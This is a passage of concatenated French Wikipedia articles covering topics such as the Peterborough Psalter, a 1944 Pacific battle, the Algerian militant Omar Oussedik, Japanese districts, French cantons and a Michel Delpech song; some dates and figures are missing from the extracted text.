Nonobstant un échec retentissant des républiques soviétiques établies par le prolétariat en Hongrie et en Bavière, la crise qui affecta le Japon et l’Amérique en 1920, ainsi qu’une résistance vigoureuse et imprévisible de la bourgeoisie, le mouvement communiste demeura empreint d’un optimisme relatif quant à la possibilité d’une victoire ultérieure. En effet, la bourgeoisie, exploitant les erreurs de tactique du prolétariat, parvint à regrouper ses forces aux côtés des social-démocrates, ce qui entraîna, en définitive, le retour des capitalistes au pouvoir.
C'est au cours de ce congrès que Lénine exposa pour la première fois ses thèses concernant la ruralité et le monde paysan.

</doc>
<doc id="8731676" url="https://fr.wikipedia.org/wiki?curid=8731676" title="Psautier de Peterborough">
Psautier de Peterborough

Le psautier de Peterborough est un manuscrit enluminé contenant le livre des Psaumes, exécuté en Angleterre vers 1300-1318. Il a été copié pour Geoffrey de Crowland, abbé de Peterborough. Il contient un cycle de 71 miniatures illustrant l'Ancien et le Nouveau Testament selon le principe de la typologie biblique. Il est actuellement conservé à la Bibliothèque royale de Belgique.
Histoire.
Le manuscrit a été copié pour Geoffrey de Crowland, abbé de l'abbaye de Peterborough. Il est représenté en prière au folio 65. En 1318, il en fait don au nonce apostolique Gaucelin d'Euse pour le pape Jean XXII. Ce dernier l'offre à Clémence de Hongrie, veuve de Louis X le Hutin, de passage à Avignon. Il est peut-être racheté à sa mort par Philippe VI de Valois. Il est recensé dans la bibliothèque du château du Louvre de son petit-fils Charles V le Sage. Le fils de ce dernier, Philippe le Bon hérite du manuscrit et le fait rentrer dans la bibliothèque des ducs de Bourgogne à Bruxelles et ajoute son blason sur certains folios. En 1794, les troupes révolutionnaires françaises font déplacer cette bibliothèque à Paris. L'ouvrage est doté de sa reliure actuelle aux armes de Napoléon. Il retourne à Bruxelles en 1816 et est aujourd'hui conservé à la Bibliothèque royale de Belgique.
Description.
Le manuscrit contient un calendrier, le livre des Psaumes et des cantiques. Il est décoré de 24 médaillons dans le calendrier et 116 miniatures. Parmi celle-ci, 71 d'entre elles illustrent l'Ancien et le Nouveau Testament et sont disposées selon le principe de la typologie biblique, chaque événement du Nouveau faisant échos à un ou plusieurs épisodes de l'Ancien. Cette iconographie pourrait avoir été influencée par les anciennes peintures présentes autrefois sur les stalles de l'abbatiale de Peterborough et remontant au . Le livre est par ailleurs décoré de 10 grandes lettrines historiées accompagnées systématiquement de marges de textes enluminées. Celles-ci représente des scènes qui s'éloignent de la religion pour représenter des scènes courtoises.
Lucy Sandler a distingué la main de trois artistes différents : la main A a peint toutes les pages jusqu'à la première page des psaumes (le "Beatus Vir", f.14), un second, la main B a peint le reste du manuscrit, assisté par un troisième, la main C qui s'est concentrée sur les parties situées avant le psaume 109 et les cantiques.
Le groupe de Fenland.
Le style du manuscrit a été rapproché d'un groupe de manuscrits tous provenant d'abbaye de la région des Fens, dans la région de l'Est-Anglie : il s'agit de quatre psautiers psautier de Ramsey, le psautier de Gough (Bibliothèque bodléienne, Gough Lith.8) qui provient aussi de Peterborough, le psautier de Barlow (BB, Barlow.22), un psautier fragmentaire (BB, Douce B4F4a et B ; d19f3a,b,c) et deux apocalypses : l'apocalypse de Canonici (BB, Canon Bibl.lat.62) et l'apocalypse de l'abbaye de Crowland (Magdalene College (Cambridge), ms.5). Des artistes du psautier de Peterborough ont aussi participé à la décoration de ces autres manuscrits : la main B par exemple au psautier de Ramsey, ainsi que dans les dernières miniatures du psautier de Gough avec la main C. Selon Lucy Sandler, bien que réalisés pour des établissements situés dans la même région, rien ne prouve que ces manuscrits aient été décorés sur place. Ils pourraient très bien provenir d'un atelier situé à Londres par exemple.
Œuvre en rapport.
Un autre psautier dit "de Peterborough" est conservé au Fitzwilliam Museum de Cambridge (ms.12) daté lui entre 1220 et 1225.

</doc>
<doc id="8731683" url="https://fr.wikipedia.org/wiki?curid=8731683" title="Coupe du monde de cyclo-cross 2015-2016">
Coupe du monde de cyclo-cross 2015-2016

La Coupe du monde de cyclo-cross 2015-2016 est la de la coupe du monde de cyclo-cross qui a lieu du 16 septembre 2015 à Las Vegas au 24 janvier 2016 à Hoogerheide. Elle comprend sept manches pour les hommes et femmes élites et six manches pour les catégories juniors et espoirs hommes, dont une organisée en Amérique du Nord. C'est la première fois qu'une manche de la Coupe du monde est organisée en dehors de l'Europe. Toutes les épreuves font partie du calendrier de la saison de cyclo-cross masculine et féminine 2015-2016.
Hommes espoirs.
Classement général.
Seuls les quatre meilleurs résultats de chaque coureur sont pris en compte pour calculer le classement général final de la Coupe du monde.
Hommes juniors.
Classement général.
Seuls les quatre meilleurs résultats de chaque coureur sont pris en compte pour calculer le classement général final de la Coupe du monde.

</doc>
<doc id="8731691" url="https://fr.wikipedia.org/wiki?curid=8731691" title="Brasil Ano 2000">
Brasil Ano 2000

 est un film de science fiction dramatique brésilien réalisé par Walter Lima Jr. sorti en 1969.
Synopsis.
Un an après la fin de la Troisième Guerre mondiale, une mère et sa fille vont entreprendre une grande odyssée dans un Brésil dévasté.
Distinctions.
Le film a été présenté à la Quinzaine des réalisateurs, en sélection parallèle du festival de Cannes 1969.

</doc>
<doc id="8731693" url="https://fr.wikipedia.org/wiki?curid=8731693" title="Enquête Ménages Déplacements">
Enquête Ménages Déplacements

Une Enquête Ménages Déplacements (EMD) est destinée à renseigner les pouvoirs publics sur les pratiques de déplacements des habitants. Elles sont réalisées selon les méthodologies dites « standard Certu ».
Histoire.
Les Enquêtes Ménages Déplacements (EMD) classiques reposent sur l'enquête en face en face de ménages entiers. Dans les années 2000, le CERTU a adapté cette méthode pour qu'elle soit applicable sur le territoire d'une ville moyenne, à un coût raisonnable. Ce sont les Enquêtes Déplacements Villes Moyennes (EDVM). Dans ce cas, le questionnaire est allégé et l'enquête est réalisée par téléphone. Enfin, lorsque les pouvoirs publics souhaitent couvrir un périmètre très large, il est possible de mettre en œuvre une Enquête Déplacements Grand Territoire (EDGT) qui combine l'EMD classique à une enquête par téléphone dans les territoires périurbains.
Des recherches sont en cours afin d'intégrer les traces GPS des habitants pour consolider et améliorer la fiabilité statistique des enquêtes.
Contenu.
Le questionnaire « standard Certu » comprend une fiche "MÉNAGE", une fiche "PERSONNE", une fiche "DÉPLACEMENTS" et une fiche "OPINION".
Les données d'une EMD sont renseignées en général via 5 tables de données décrivant les 5 "objets" suivants :
Ces données d'enquête brutes font l'objet d'une exploitation standard : des fiches synthétiques sont générées pour disposer des principaux indicateurs de déplacements déjà agrégés. Pour passer des valeurs de l'échantillon de l'enquête aux chiffres représentatifs pour le territoire enquêté, il est utilisé un coefficient de redressement par ménage.
Applications.
L'EMD est utilisée largement dans les diagnostics de territoire possédant un volet déplacements. Cette enquête est ainsi souvent la pierre angulaire de l'état des lieux pour les plans de déplacements urbains (PDU), les Diagnostics Énergie Émissions des Mobilités (DEEM) ou autres modèles de déplacements.
Le des téléphones portatifs ouvre la voie à des analyses encore plus fines de l'habitabilité des lieux, et des déplacements.

</doc>
<doc id="8731784" url="https://fr.wikipedia.org/wiki?curid=8731784" title="District de Kamimashiki">
District de Kamimashiki

Le est un district de la préfecture de Kumamoto, au Japon, étendu sur une superficie de .
Histoire.
Le , le village de Seiwa fusionne avec les bourgs de Soyō et Yabe, du district d'Aso, pour former le bourg de Yamato.

</doc>
<doc id="8731812" url="https://fr.wikipedia.org/wiki?curid=8731812" title="Charte de San Francisco">
Charte de San Francisco



</doc>
<doc id="8731821" url="https://fr.wikipedia.org/wiki?curid=8731821" title="Alonso de Castillo Solórzano">
Alonso de Castillo Solórzano

Alonso del Castillo Solorzano (Tordesillas, -Saragosse ou Palerme, v.1648) est un écrivain espagnol.
Biographie.
On ne sait rien de sa jeunesse. Vers 1619, il travaille pour le vice-roi de Valence qu'il suit dans les campagnes de Catalogne puis à Rome. Le fait qu'il ne soit plus mentionné dans l'entourage du vice-roi en 1648, fait supposer de son probable décès à cette époque.
Œuvres.
On lui doit des romans picaresques dont de nombreux ont été traduits en français :
Il est l'auteur aussi de comédies et d'une histoire romanesque de Marc-Antoine et Cléopâtre (1639).

</doc>
<doc id="8731822" url="https://fr.wikipedia.org/wiki?curid=8731822" title="District de Shimoina">
District de Shimoina

Le est un district de la préfecture de Nagano, au Japon.
Géographie.
Le district de Shimoina s'étend sur .

</doc>
<doc id="8731828" url="https://fr.wikipedia.org/wiki?curid=8731828" title="District de Kitaazumi">
District de Kitaazumi

Le est un district de la préfecture de Nagano, au Japon
Géographie.
Le district de Kitaazumi s'étend sur .
Histoire.
Le , les villages de Yasaka et Miasa sont annexés à la ville d'Ōmachi.

</doc>
<doc id="8731829" url="https://fr.wikipedia.org/wiki?curid=8731829" title="Esperanza (République dominicaine)">
Esperanza (République dominicaine)

Esperanza est une municipalité de la province de Valverde dans le nord de la République dominicaine.
La population était de en 2002.

</doc>
<doc id="8731839" url="https://fr.wikipedia.org/wiki?curid=8731839" title="Élections cantonales de 2008 dans les Bouches-du-Rhône">
Élections cantonales de 2008 dans les Bouches-du-Rhône

Les élections cantonales ont lieu les et .
Lors de ces élections, 28 des 57 cantons des Bouches-du-Rhône sont renouvelés. Elles voient la reconduction de la majorité socialiste dirigé par Jean-Noël Guérini, président du conseil général depuis 1998.

</doc>
<doc id="8731841" url="https://fr.wikipedia.org/wiki?curid=8731841" title="William Stoddart">
William Stoddart

, né le à Carstairs en Écosse et mort le à Windsor (Ontario) au Canada, est un traducteur, essayiste et philosophe pérennialiste écossais.
Biographie.
Il étudie aux universités de Glasgow, d'Édimbourg et de Dublin. Diplômé en médecine, il exerce sa profession quelques années dans son cabinet de généraliste avant d'opter pour la recherche dans l'industrie pharmaceutique.
En 1945, il découvre les écrits d'Ananda Coomaraswamy puis ceux de René Guénon, qui l'initient au pérennialisme. En 1953, il rencontre deux autres pérennialistes : Titus Burckhardt et Frithjof Schuon, lequel deviendra son guide spirituel.
Très intéressé par les religions, il voyage abondamment, notamment au Mont Athos, en Afrique du Nord, en Inde, au Sri Lanka, au Japon.
En 1968, il s'installe à Londres, où il devient rédacteur adjoint de la revue "". En 1982, il émigre à Windsor en Ontario (Canada), où il poursuit la rédaction d'essais et de traductions en anglais d'ouvrages pérennialistes français et allemands. Il y meurt le 9 novembre 2023, âgé de 98 ans
Ouvrages.
La plupart des titres ont été traduits en français.
En tant que directeur de publication :

</doc>
<doc id="8731846" url="https://fr.wikipedia.org/wiki?curid=8731846" title="Eugène Cadel">
Eugène Cadel

Eugène-Casimir Cadel, né le à Paris et mort à Paris le , est un artiste peintre, graveur, critique d'art et enseignant français.
Biographie.
Eugène-Casimir Cadel est le fils d'Espérance-Amélie Duthuillé et de Jean-Casimir-Marin Cadel, pharmacien dans le de Paris rue de la Grange-aux-Belles.
Il entre à l’École des beaux-arts de Paris en 1882 et suit les cours d'Alexandre Cabanel, Luc-Olivier Merson et de Puvis de Chavannes.
Il expose au moins à partir de 1887, notamment au Salon des artistes français (1911-1940), au Salon des humoristes (1907-1914), et à la Société nationale des beaux-arts, dont il devient membre du jury puis secrétaire en 1920.
En 1901, il ouvre son propre atelier de production de gravures, « La Lithographie nouvelle ». Il publie de nombreux dessins satiriques assez féroces dans "L'Assiette au beurre", "Le Sourire", "Le Petit Journal supplément illustré", "Le Matin", "La Presse" (où il est critique d'art à partir de 1915), "Les Annales politiques et littéraires", etc. Il participe à la Collection des cent.
Son style de peinture appartient à la veine postimpressionnisme s'exprimant à travers des paysages ; il fréquente l'École de Pont-Aven. Il produit des scènes de genre, quelques dessins érotiques et des eaux-fortes. Il illustre également des ouvrages.
En 1927, il est fait chevalier de la Légion d'honneur
Vie privée.
Il épouse le février 1910 à Paris Henriette-Laure Liaudet.
Son domicile parisien se situait 30 rue de La Trémoïlle.
Œuvre.
Eugène Cadel signe habituellement ses œuvre « Eug. Cadel » ou « Cadel ».

</doc>
<doc id="8731849" url="https://fr.wikipedia.org/wiki?curid=8731849" title="Miyake (Nara)">
Miyake (Nara)

 est un bourg du district de Shiki, dans la préfecture de Nara, au Japon.
Géographie.
Démographie.
Au , la population de Miyake s'élevait à répartis sur une superficie de .

</doc>
<doc id="8731854" url="https://fr.wikipedia.org/wiki?curid=8731854" title="Siné Madame">
Siné Madame



</doc>
<doc id="8731860" url="https://fr.wikipedia.org/wiki?curid=8731860" title="Peng Cheng">
Peng Cheng

Peng Cheng, née le à Harbin est une patineuse artistique chinoise. Avec son partenaire de couple Zhang Hao, avec lequel elle patine depuis 2012, elle est championne de Chine 2014 et gagnante de la Coupe de Chine 2014. Dans les grands championnats, le couple compte une participation aux Jeux olympiques ( à Sotchi en 2014) et une cinquième place aux Mondiaux 2014 comme meilleur résultat aux Championnats du monde.
Palmarès.
Avec deux partenaires:

</doc>
<doc id="8731861" url="https://fr.wikipedia.org/wiki?curid=8731861" title="Bataille de Noemfoor">
Bataille de Noemfoor

La bataille de Noemfoor est une bataille de la guerre du Pacifique durant la Seconde Guerre mondiale lors de la campagne de Nouvelle-Guinée. 
L'état-major américain voulut prendre les 3 aérodromes que les Japonais avaient construit sur cette île avec le recours de travailleurs forcés Taïwanais et Indonésiens qui étaient encore environ sur l'île au début de la bataille.
La bataille.
L'assaut amphibie fut mené par le d'Infanterie le , les forces américaines ne rencontrèrent presque aucune opposition sur les plages, en raison de l'intense bombardement naval y ayant eu lieu les heures précédentes, et des raids aériens des précédentes semaines qui ont drastiquement mis à mal les fortifications japonaises près des côtes. L'US Army prenant ce même jour un premier aérodrome, celui de Kamiri, ne déplora que 3 morts et 21 blessés le premier jour de la bataille, les Japonais perdirent de leur côté au moins 115 tués.
Ne connaissant pas les forces réelles et la taille de la garnison ennemie stationnée sur l'île, deux bataillons du du parachutistes furent lâchés dès le lendemain sur Kamiri. Des mauvaises communications avec les troupes au sol firent que les parachutistes furent non seulement lâchés trop près du sol mais également souvent sur des zones constellées de matériel et véhicules américains, d'équipement japonais détruits mais aussi de troncs d'arbres qui engendrèrent 128 blessés sur les 1424 hommes ayant atterri sur l'île le 3 et 4 juillet. Malgré tout, ce renfort de troupes a permis d'accélérer les opérations, permettant à l'infanterie arrivée par la mer le de poursuivre leur avancée dans l'île. Face à ces déconvenues, le dernier bataillon de ce régiment arrivera par la mer le .
Le , un bataillon du d'Infanterie pris le contrôle du deuxième aérodrome, celui de Kornasoren qui s'est avéré miné et défendu par une résistance anecdotique. Cependant, une contre-attaque japonaise d'environ 400 hommes y fut repoussée le .
Le bataillon de parachutistes arrivé par la mer le pris le contrôle de l'île de Namber et de son aérodrome le même jour.
La majeure partie de l'île sécurisée, il restait malgré tout un groupe de soldats japonais d'environ 500 hommes encore actifs dans le sud de l'île qui fut traqué et lentement annihilé par les parachutistes jusqu'à la fin du mois d'août.
Le , l'île fut déclarée sécurisée.
Conséquences.
Sur les 3 aérodromes conquis, seuls deux d'entre eux furent en fait utilisés par l'US Air Force, ceux de Kamiri et de Kornosaren. Celui de Kornosaren fut agrandi et amélioré et fut pleinement opérationnel dès le .
Il servit notamment pour les bombardements de Bornéo et de ses installations pétrolières.
Près de 700 travailleurs forcés furent libérés par les Américains (144 Indonésiens et plus de 550 Taïwanais).

</doc>
<doc id="8731871" url="https://fr.wikipedia.org/wiki?curid=8731871" title="Waterboy (homonymie)">
Waterboy (homonymie)

Waterboy(s) (que l'on peut traduire par "porteur(s) d'eau") peut désigner plusieurs choses :

</doc>
<doc id="8731876" url="https://fr.wikipedia.org/wiki?curid=8731876" title="Auto-Fähre Vierwaldstättersee">
Auto-Fähre Vierwaldstättersee

Le Auto-Fähre Vierwaldstättersee (en français : "Bac du lac des Quatre-Cantons") est un bac (ou ferry) sur le lac des Quatre-Cantons entre Beckenried (canton de Nidwald) et Gersau (canton de Schwytz). Le trajet de est parcouru en 20 minutes, remplaçant un détour de par la route. Le bac est exploité d'avril à octobre.
Ce service de bac est en fonction depuis 1930, avec une interruption durant la Seconde Guerre mondiale. Le même bateau à moteur est toujours utilisé : le "Tellsprung", construit en 1929 et rénové en 1963.

</doc>
<doc id="8731878" url="https://fr.wikipedia.org/wiki?curid=8731878" title="Splendeur (film, 1935)">
Splendeur (film, 1935)

Splendeur "()" est un film américain réalisé par Elliott Nugent, sorti en 1935.
Synopsis.
À New York, les Lorrimore sont une famille dont la richesse a disparu et qui est maintenant couverte de dettes. Ils fondent leurs espoirs sur le fils aîné, Brighton, mais lorsque celui-ci revient après une année dans le sud, la révélation de son mariage avec une jeune femme pauvre, Phyllis, choque sa mère, sa sœur Martha et son frère Clancey, un bon-à-rien. Phyllis se rend vite compte qu'elle n'est pas acceptée par la famille, la seule qui l'apprécie est Edith Gilbert, une héritière que l'on aurait bien vu épouser Brighton. 
Elle voudrait partir avec ce dernier pour qu'il puisse réaliser son rêve d'être écrivain, mais l'argent est trop important pour lui. Elle décide alors de demander l'aide d'un riche cousin de la famille, Martin Deering. Bientôt des rumeurs apparaissent à propos de leur relation. Phyllis et Martin deviennent amants pendant que Brighton est en voyage d'affaires au Mexique. À son retour, le couple se querelle, et elle avoue sa relation avec Martin et le quitte. Elle commence à travailler comme vendeuse dans un magasin chic, mais refuse d'épouser Martin. Un soir, Brighton la rencontre dans le magasin et lui demande de revenir avec lui. 
Ils décident alors de recommencer à vivre ensemble.

</doc>
<doc id="8731883" url="https://fr.wikipedia.org/wiki?curid=8731883" title="Autofähre Beckenried-Gersau">
Autofähre Beckenried-Gersau



</doc>
<doc id="8731885" url="https://fr.wikipedia.org/wiki?curid=8731885" title="Omar Oussedik">
Omar Oussedik

Omar Oussedik, né en 1920 à Michelet Aïn El Hammam, Tizi-Ouzou et mort en 1992, a été un militant du Parti du peuple algérien (PPA) et des Amis du manifeste et de la liberté (AML). Membre du Comité central du Mouvement pour le triomphe des libertés démocratiques (MTLD), il est emprisonné puis vit en exil en France. Après avoir été membre du Parti communiste algérien (PCA) peut-être en 1953, il entre au FLN en 1955, et devient commandant dans la Wilaya IV; peu après, secrétaire d’État dans le premier Gouvernement provisoire de la République algérienne (GPRA) en 1958, et redéploie la Zone autonome d'Alger en 1962. 
Biographie.
Scolarité et Engagement dans le mouvement national.
La famille Oussedik est une famille maraboutique qui fait bénéficier ses enfants de la scolarisation engagée par la France en Algérie a destination des algériens. Dans la lignée de son frère aîné Tahar qui sera instituteur, syndicaliste de l’enseignement et se spécialisera pas la suite dans l'étude de l’histoire de la Kabylie, Omar Oussedik entre à l’École normale de Bouzareah. Il poursuit ensuite ses études secondaires au lycée de Ben Aknoun à Alger où les élèves de Kabylie se regroupent, associant le sentiment national aux attachements aux traditions kabyles. Dès 1943, il participe aux campagnes des Amis du manifeste et de la liberté (AML) et devient militant du PPA clandestin. Il est en Kabylie en mai 1945, il dit avoir transmis l’ordre de soulèvement dans le massif kabyle entre Dellys et Tigzirt, les 20 et 22 mai, avant les contrordres des jours suivants. Au congrès du MTLD de février 1947, il soutient le projet de préparer l’insurrection armée par la constitution d’une Organisation spéciale dont Hocine Aït Ahmed établit la plateforme et la mise en place. Il entre au Comité central du MTLD.
Militantisme syndical et politique.
Quand sévit la « Crise berbériste » qui exclut du MTLD plusieurs de ses anciens camarades, il se trouve hors de combat, il est en effet arrêté à Alger en 1948 et incarcéré à la prison de Blida jusqu’en 1951, après avoir subi des actes de torture. Il a fait partie des militants exclus du MTLD mais sans être accusé de berbérisme. Après sa sortie de prison, il vit en France, travaillant en région parisienne, y compris en usine, militant de la Confédération générale du travail (CGT), se donnant une formation politique qui le fera par la suite traité de « marxiste ». En 1953, comme d’autres jeunes intellectuels acquis aux idées sociales et progressistes et à une conception d’une Algérie algérienne qui soit la nation des Algériens de toutes origines, notamment Sadek Hadjerès et Ahmed Benzine, il serait passé au PCA. Alors que ceux-ci y demeurent, Omar Oussedik, selon la formule de Gilbert Meynier, se contente d’ « un tour de valse ». Il n’en sera pas moins toujours soupçonné d’entretenir des sympathies communistes. Il rejoint le FLN en 1955.
Engagement dans le combat pour l'indépendance de l'Algérie.
Au maquis de la Wilaya IV dans l’Algérois, il monte en grade et devient en 1957 commandant chargé des liaisons et des communications. Tout en se démarquant des suspicions de communisme et de marxisme, il doit assurer l’intégration des maquisards communistes venant des Combattants de la libération, et des lycéens et étudiants frottés de progressisme. Dans les quelques numéros de "Révolution," le journal de la Wilaya, on parle de lutte de libération contre l’impérialisme sans références arabo-islamiques. Aussi Omar Oussedik, déjà suspect parce qu’il vit au maquis avec son épouse qui est infirmière, est pris dans la tourmente de l’espionnite qui gagne la Wilaya et où le colonel Si M'Hamed Bougara excite les réflexes populistes des petits contre les intellectuels francisés et ouvre le temps des purges de 1957 à 1958. À chaque discours du général Charles de Gaulle qu’Omar Oussedik interprète comme un changement d’orientation de la politique française, la méfiance grandit ; on se situe cependant bien avant l’affaire Si Salah. Il est aussi accusé d’être sensible au gaullisme et de pousser à la négociation. Il a peut-être été sauvé du pire en étant appelé à Tunis par Krim Belkacem. Il est secrétaire d’État dans le premier Gouvernement provisoire de la République algérienne (GPRA) constitué en 1958. En mars 1959, il fait partie de la mission en Chine pour négocier contrat d’armes et soutien, puis à Hanoï pour marquer la solidarité des luttes de libération. C’est pour ses idées qu’il est nommé en 1960 chef de mission en Guinée auprès de Ahmed Sékou Touré, précédant Mohammed Harbi à Conakry. Simple membre du CNRA en 1961-1962, il apparaît comme un des plus opiniâtres opposants aux grandes manœuvres de l’État-major général autour des colonels Ali Mendjeli et Boumédiène.
Aussitôt après les Accords d'Évian, il entre dans le projet de Krim Belkacem de contrer la montée en puissance du commandant Hassan (Youcef Khatib) dans la Wilaya IV, en reconstituant la Zone autonome d’Alger. Cherchant à entraîner Mohammed Harbi, il va jusqu’à lui faire valoir la science marxiste de son partenaire, le commandant Azzedine : « L’avenir se joue à l’intérieur, argumente Omar Oussedik ; j’ai trouvé une filière pour entrer en Algérie... veux-tu être des nôtres ? Azzedine est un homme sûr. Il pense comme nous. Il a lu "Le Capital »." « Sacré Omar ! reprend Mohammed Harbi. La manipulation lui collait à la peau. Je suis parti d’un grand éclat de rire, il a compris ma réaction et fait de même ». M.Harbi refuse de rentrer avec la fausse vraie carte d’identité française qu’Omar Oussedik lui procure.
Dans l'Algérie indépendante.
Dans ses mémoires, celui-ci reconnaît que les commandants Azzedine et Oussedik à la tête de la Zone autonome d'Alger « ont réussi à préparer la population algéroise à faire face à la terreur de l’Organisation de l'armée secrète (OAS). Mais ils ont également accrédité la rumeur d’une collusion entre l’Algérie et la France contre l’armée de l’extérieur ». Il faut aussi porter au crédit d’Omar Oussedik, à travers la Zone autonome, d’avoir assuré dans le chaos d’Alger, le fonctionnement d’un Service social et de santé et soutenu la reconstitution de l’Union générale des travailleurs algériens (UGTA) sous le mandat attribué depuis Tunis à un trio de direction disponible et actif sur place, formé de Rabah Djermane, Boualem Bourouiba et Mustapha Lassel, dernier feu d’un syndicalisme autonome. Entré aux Affaires étrangères dès la fin de 1962, Omar Oussedik sera ambassadeur d’Algérie à Sofia, Moscou, New Delhi et Rome. 
Il est mort à Alger, en 1992.

</doc>
<doc id="8731893" url="https://fr.wikipedia.org/wiki?curid=8731893" title="P2H">
P2H



</doc>
<doc id="8731894" url="https://fr.wikipedia.org/wiki?curid=8731894" title="Anthony Le Roux">
Anthony Le Roux

Anthony Le Roux est un joueur international de rink hockey né le . Formé à Ploufragan, il évolue au sein du club de Saint-Brieuc avant de revenir à Ploufragan en 2021.
Parcours sportif.
En 2014, il est sélectionné en équipe de France pour participer au Championnat d'Europe.
Palmarès.
En 2013, il termine à la troisième place du championnat de France de Nationale 1 avec le club du RAC Saint-Brieuc.

</doc>
<doc id="8731902" url="https://fr.wikipedia.org/wiki?curid=8731902" title="The Antidote (Ronny Jordan)">
The Antidote (Ronny Jordan)

The Antidote est un album du guitariste de jazz Ronny Jordan. 
C'est son premier album solo, sorti en 1992 sur le label Island Records. La reprise de "So What" de Miles Davis a connu un grand succès. Le morceau "After Hours" est remarqué pour l'alliance entre l'acid jazz et le smooth jazz.

</doc>
<doc id="8731917" url="https://fr.wikipedia.org/wiki?curid=8731917" title="Canton de Baule">
Canton de Baule

Le canton de Baule ou canton de Bosle est une ancienne division administrative française du district de Beaugency situé dans le département du Loiret.
Histoire.
Le canton est créé le sous la Révolution française.
Le canton disparaît en 1801 (9 vendémiaire, an X) sous le Premier Empire ; toutes ses communes sont reversées dans le canton de Beaugency.
Géographie.
Le canton de Baule comprend les trois communes suivantes : Baule (que l'on trouve aussi sous les toponymes de Bosle, Baûle ou Bault-et-Villeneuve), Cravant et Messas (ou Messat).

</doc>
<doc id="8731918" url="https://fr.wikipedia.org/wiki?curid=8731918" title="Africando Best-Of">
Africando Best-Of

Africando Best-Of est un album compilation du groupe Africando sorti en 2007.

</doc>
<doc id="8731920" url="https://fr.wikipedia.org/wiki?curid=8731920" title="Équipe cycliste Sengers Ladies">
Équipe cycliste Sengers Ladies

L'équipe cycliste Sengers Ladies est une ancienne équipe cycliste féminine belge. Créée en 2011, elle devient UCI l'année suivante. Elle était dirigée par Marc Bracke. Elle a notamment eu dans ses rangs Anna van der Breggen.
Classements UCI.
Ce tableau présente les places de l'équipe au classement de l'Union cycliste internationale en fin de saison, ainsi que la meilleure cycliste au classement individuel de chaque saison.
Le tableau ci-dessous présente les classements de l'équipe sur la Coupe du monde, ainsi que sa meilleure coureuse au classement individuel.
Encadrement de l'équipe.
Marc Bracke est le directeur sportif et le représentant auprès de l'UCI de l'équipe pendant son existence. En 2012, il est assisté de Filip Thoen et en 2013 de Julia Verwulgen
Sponsors.
Le constructeur de machine Sengers Metaal B.V. est le partenaire principal de l'équipe. Les cycles sont fournis par n7even en 2013
Déroulement de la saison.
En 2013, au Grand Prix international de Dottignies, un groupe d'échappée de treize concurrentes se détache à de l'arrivée avec parmi elles Vera Koedooder. Cette dernière attaque à du but et s'impose en solitaire. Le , elle s'impose au circuit de Borsele.
Lors de l'Erondegemse Pijl, l'équipe réalise le triplet. Maaike Polspoel s'impose en solitaire, tandis que Sofie de Vuyst et Christine Majerus règlent le peloton.
Saisons précédentes.
En , Anna van der Breggen gagne trois des quatre étapes du Tour de Bretagne dont l'étape contre-la-montre. Elle s'impose finalement au classement général avec quasiment trois minutes d'avance sur la deuxième. Dans la foulée, elle remporte le contre-la-montre du Tour féminin en Limousin.

</doc>
<doc id="8731937" url="https://fr.wikipedia.org/wiki?curid=8731937" title="Canton de Jaunay-Marigny">
Canton de Jaunay-Marigny

Le canton de Jaunay-Marigny, précédemment appelé canton de Jaunay-Clan, est un canton français situé dans le département de la Vienne et la région Nouvelle-Aquitaine.
Histoire.
Un nouveau découpage territorial de la Vienne entre en vigueur à l'occasion des premières élections départementales suivant le décret du . Les conseillers départementaux sont, à compter de ces élections, élus au scrutin majoritaire binominal mixte. Les électeurs de chaque canton élisent au Conseil départemental, nouvelle appellation du Conseil général, deux membres de sexe différent, qui se présentent en binôme de candidats. Les conseillers départementaux sont élus pour au scrutin binominal majoritaire à deux tours, l'accès au second tour nécessitant 12,5 % des inscrits au . En outre la totalité des conseillers départementaux est renouvelée. Ce nouveau mode de scrutin nécessite un redécoupage des cantons dont le nombre est divisé par deux avec arrondi à l'unité impaire supérieure si ce nombre n'est pas entier impair, assorti de conditions de seuils minimaux. Dans la Vienne, le nombre de cantons passe ainsi de 38 à 19.
Le canton de Jaunay-Clan est formé de communes des anciens cantons de Vouneuil-sur-Vienne (), de Neuville-de-Poitou () et de Saint-Georges-lès-Baillargeaux (). Avec ce redécoupage administratif, le territoire du canton s'affranchit des limites d'arrondissements, avec incluses dans l'arrondissement de Châtellerault et 7 dans l'arrondissement de Poitiers. Le bureau centralisateur est situé à Jaunay-Clan.
À la suite du décret du , le canton prend le nom de son bureau centralisateur, Jaunay-Marigny.
Représentation.
À l'issue du des élections départementales de 2015, deux binômes sont en ballotage : Francis Girault et Karine Journeau (DVD, 40,65 %) et Maryse Lacombe et Jean-Luc Rivière (FN, 25,39 %). Le taux de participation est de 49,36 % ( sur ) contre 51,35 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Francis Girault et Karine Journeau (DVD) sont élus avec 70,54 % des suffrages exprimés et un taux de participation de 49,22 % ( pour et ).
Composition.
Lors du redécoupage de 2014, le canton comprenait huit communes entières.
À la suite de la création des communes nouvelles de Beaumont Saint-Cyr, Jaunay-Marigny et Saint-Martin-la-Pallu au , ainsi qu'au décret du , rattachant entièrement la commune nouvelle de Saint-Martin-la-Pallu au canton de Jaunay-Marigny, le canton comprend désormais six communes entières.

</doc>
<doc id="8731938" url="https://fr.wikipedia.org/wiki?curid=8731938" title="Le Loir-et-Cher">
Le Loir-et-Cher

Le Loir-et-Cher est une chanson française de 1977 interprétée par Michel Delpech. Inspirée des souvenirs d'enfance du chanteur, cette chanson à la fois rock et « champêtre » constitue le dernier grand succès de sa carrière.
Histoire.
En 1977, Michel Delpech décide de changer de répertoire et de style musical en adoptant un son un peu plus rock. Pour les paroles du "Loir-et-Cher", il s'inspire de ses souvenirs d'enfance et particulièrement des vacances qu'il passait dans sa famille à La Ferté-Saint-Cyr et à Dhuizon dans le Loir-et-Cher. 
Pour Michel Delpech, le succès de sa chanson est dû au .
Classements.
 

</doc>
<doc id="8731964" url="https://fr.wikipedia.org/wiki?curid=8731964" title="Abbaye de la Bourdillière">
Abbaye de la Bourdillière

L'abbaye de la Bourdillière est une ancienne abbaye de moniales cisterciennes située sur la commune de Genillé, dans le département d'Indre-et-Loire
Fondée en 1622, l'abbaye est fermée un siècle plus tard et ses bâtiments vendus à la Révolution. Le logis conventuel subsiste, transformé en habitation ainsi que le logis seigneurial.
Localisation.
L'ancienne abbaye de la Bourdillière se situe à environ à l'ouest du centre-bourg de Genillé, sur la rive gauche de l'Indrois.
Historique.
Le domaine de la Bourdillière était composé de deux fiefs distincts, appartenant au milieu du à la famille Fumée ; le logis seigneurial autrefois fortifié (pont-levis et douves) a survécu.
